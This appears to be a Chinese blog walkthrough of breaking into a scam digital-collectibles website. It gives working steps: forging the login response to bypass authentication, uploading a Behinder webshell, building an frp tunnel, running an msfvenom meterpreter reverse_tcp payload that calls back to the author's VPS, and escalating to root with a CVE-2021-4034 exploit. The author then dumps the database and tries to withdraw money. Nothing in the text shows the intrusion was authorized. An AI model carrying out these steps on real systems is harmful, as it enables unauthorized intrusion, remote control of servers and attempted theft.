# 实战 | 杀猪盘渗透测试

这是一个主打数字藏品的网站元宇宙妥妥的割韭菜，关于这个网站也是无意间找到的。  

![](../Images/d4e7346d2be9ded55308059dc17e90f8.png)

看起来非常假的网站这个网站是没有cdn的用的是thinkphpk框架搭建的。

![](../Images/3da745210c9fd0f0550db54c68467321.png)

先打一波poc没有效果，

![](../Images/2b594c38aaafb20dccdd03a60158f060.png)

访问一下后台直接在url后面加/admin。

![](../Images/c47675a8f08bea1cd1745e17dc370d85.png)

一个开源的cms还没有验证码尝试用burp进行爆破，首先在火狐上设置代理ip为127.0.0.1代理端口为8081。

![](../Images/41b156cf7a39c4faded86216a342ab2a.png)

Burp上也要设置端口为8081,将Intercept设置为on输入账号密码点击登录就能拦截到数据包。

![](../Images/abc02de214b2d9f50ab4084656f84abe.png)

![](../Images/60d3b0f4a624be0dedbf00d596c817b0.png)

在爆破之前先发送到Repeater模块发送看看反应。

![](../Images/211eb350145567ecb3383c8922766c36.png)

用户不存在返回code为1的响应码，尝试拦截返回包把1改为0。

![](../Images/1e8fc4c8abf943889b791b9e5091d5f9.png)

成功登录后台，这应该是个前端js验证非常的不安全。

![](../Images/f3b0b2d1b7d575a345bf0909233ec2cb.png)

尝试找上传点，点击用户管理-编辑-上传头像，上传一张jpg文件在用burp抓包改为php将内容改为冰蝎马。成功上传链接冰蝎马。

![](../Images/7b8b0b93ac45c9555837d331ad066e1e.png)

想办法上线到msf提权，这里就使用frp内网穿透，在我的vps开启frp。./frps -c frps.ini

![](../Images/932068f3985da9d9ee175f5a81e26047.png)

在内网上的kali进行设置设置配置文件将8000端口的流量转到kali的6666端口。启动客户端./frpc -c frpc.ini

![](../Images/40f1782f91bc3efcb0cdcf7fd56d7948.png)

![](../Images/3baf35eca4bfeb5ae7e198cd343ee20c.png)

生成msf木马ip和端口要填vps的msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=\*\*\*\*  LPORT=8000  -f elf > shell.elf这里的lhost 应为服务器地址 LPORT 为反向代理端口，将shell.elf上传到/www/wwwroot/目录设置权限为777。

![](../Images/71007e98f41cf3992321277044179cbb.png)

打开msf进行监听

*   
*   
*   
*   
*   

```
`use exploit/multi/handler``set payload linux/x64/meterpreter/reverse_tcp``set lhost 127.0.0.1``set lport 6666``exploit`
```

运行shell.elf./shell.elf

![](../Images/23dbd3d16efee85e004807fe4416ded9.png)

成功返回会话。

![](../Images/71808de03a9ca1f13cf4a7d6b3cceed5.png)

使用模块run post/multi/recon/local\_exploit\_suggester进行漏洞查询。

![](../Images/64352d5a6cb4661c231498f672567115.png)

使用cve-2021-4034提权，切换到linux shell下面然后进到/tmp目录下下载脚本。git clone https://github.com/berdav/CVE-2021-4034.git

![](../Images/4ec84326d30961dd815b845b7244362b.png)

似乎不行卡住了直接上传上去吧。

*   
*   
*   
*   
*   
*   

```
`upload /home/kali/Desktop/CVE-2021-4034  /tmp/``进入shell``cd /tmp``make``chmod 777 cve-2021-4034``./cve-2021-4034`
```

返回root权限。

![](../Images/18c87f2651b4a9220af876aa626c2276.png)

查看database.php文件链接数据库发现基本上也没有人充值，看到一个账号40w的就是这家所谓数字藏品公司的老总。

![](../Images/0392d17290ad57bf751543593ad13002.png)

登进入尝试提现均提示账户金额异常看来是跑路了，加了它们的官方群进入一看全是讨钱的在这里提醒一下各位这种所谓的数字藏品都是骗局根本提不出来钱的。
